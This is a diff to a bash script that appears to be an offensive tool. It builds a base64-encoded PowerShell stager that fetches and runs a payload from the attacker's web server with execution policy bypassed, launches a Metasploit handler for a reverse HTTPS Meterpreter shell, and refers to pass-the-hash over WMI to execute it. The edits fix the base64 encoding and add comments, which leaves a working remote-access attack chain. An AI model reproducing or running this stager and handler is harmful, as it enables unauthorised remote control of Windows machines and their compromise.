@@ -21,6 +21,7 @@ then
 fi
 
 #argument $5 should be an integer between 1-65535 and not in use
+#change to netstat
 check=`lsof -i :$5`
 if [[ -z "$check" ]]
 then
@@ -28,6 +29,7 @@ then
 	exit 1
 fi
 
+#its late
 if [ $5 -ge 1 ] && [ $5 -lt 65535 ]
 then
 	echo "Local port for handler must be between 1-65535."
@@ -56,10 +58,10 @@ echo "$func" >> /var/www/plugin
 
 #base64 encode the stager scriptblock: {iex (New-Object Net.WebClient).DownloadString('http://$lhost/plugin')}
 scriptblock="iex (New-Object Net.WebClient).DownloadString('http://$lhost/plugin')"
-encode="echo `echo $scriptblock | base64`"
+encode="echo `echo $scriptblock | base64 -w 0`"
 command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
 
-#start multi/handler
+#start multi/handler 
 msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport E
 
 #pth with WMI to execute meterpreter
